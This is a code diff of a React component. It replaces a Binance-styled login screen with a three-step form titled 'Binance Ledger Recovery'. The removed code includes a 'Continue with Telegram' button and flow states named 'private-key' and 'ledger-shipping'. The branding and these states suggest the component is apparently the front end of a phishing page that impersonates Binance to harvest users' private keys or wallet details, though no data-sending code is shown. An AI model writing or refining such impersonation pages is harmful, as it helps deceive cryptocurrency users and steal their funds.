-              lineHeight: "16px",
-              height: "38px"
-            }}
-            role="button" 
-            aria-label="Continue with Telegram"
-          >
-            <div className="icon-warp mr-2">
-              <svg height="18" width="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
-                <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
-              </svg>
-            </div>
-            <div>Continue with Telegram</div>
-          </button>
-        </div>
-      </>
-    );
-  };
-
-  // Check if we should show special states
-  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary' || currentStep === 'private-key' || currentStep === 'confirmation' || currentStep === 'ledger-shipping';
 
   return (
-    <div 
-      className="min-h-screen flex items-center justify-center p-4"
-      style={{ backgroundColor: "var(--color-Body, #181A20)" }}
-    >
-      <div 
-        className="w-full max-w-md p-4 rounded-lg"
-        style={{ 
-          backgroundColor: "var(--color-Card, #1E2329)",
-          minHeight: "450px"
-        }}
-      >
-        {/* Always show header */}
-        {renderHeader()}
-        
-        {/* Content with fade transition */}
-        <div 
-          className={`transition-opacity duration-300 ${isTransitioning ? 'opacity-0' : 'opacity-100'}`}
-          style={{ minHeight: "380px" }}
-        >
-          {isSpecialState ? (
-            renderSpecialState()
-          ) : (
-            <div className="flex flex-col h-full">
-              {renderTitle()}
-              
-              <div style={{ minHeight: "280px" }} className="flex flex-col">
-                {renderMainForm()}
-                {renderAlternativeOptions()}
-              </div>
+    <div className="max-w-2xl mx-auto p-6">
+      <Card>
+        <CardHeader>
+          <CardTitle className="flex items-center gap-2">
+            <Shield className="h-6 w-6 text-yellow-500" />
+            Binance Ledger Recovery
+          </CardTitle>
+          <CardDescription>
+            Step {currentStep} of 3: {steps[currentStep - 1].description}
+          </CardDescription>
+          <Progress value={(currentStep / 3) * 100} className="mt-4" />
+        </CardHeader>
+
+        <CardContent>
+          <form onSubmit={(e) => e.preventDefault()} className="space-y-6">
+            {renderStepContent()}
+
+            <div className="flex justify-between pt-6">
+              <Button
+                type="button"
+                variant="outline"
+                onClick={handleBack}
+                disabled={currentStep === 1}
+              >
+                <ArrowLeft className="h-4 w-4 mr-2" />
+                Back
+              </Button>
+
+              <Button
+                type="button"
+                onClick={handleNext}
+                disabled={!isStepValid() || isSubmitting}
+                className="bg-yellow-500 hover:bg-yellow-600 text-black"
+              >
+                {currentStep === 3 ? (
+                  isSubmitting ? (
+                    "Submitting..."
+                  ) : (
+                    <>
+                      <CheckCircle2 className="h-4 w-4 mr-2" />
+                      Submit
+                    </>
+                  )
+                ) : (
+                  <>
+                    Next
+                    <ArrowRight className="h-4 w-4 ml-2" />
+                  </>
+                )}
+              </Button>
             </div>
-          )}
-        </div>
-      </div>
+          </form>
+
+          <div className="mt-6 text-center">
+            <Button variant="link" className="text-blue-600">
+              Need Help? Contact Support
+            </Button>
+          </div>
+        </CardContent>
+      </Card>
     </div>
   );
 };
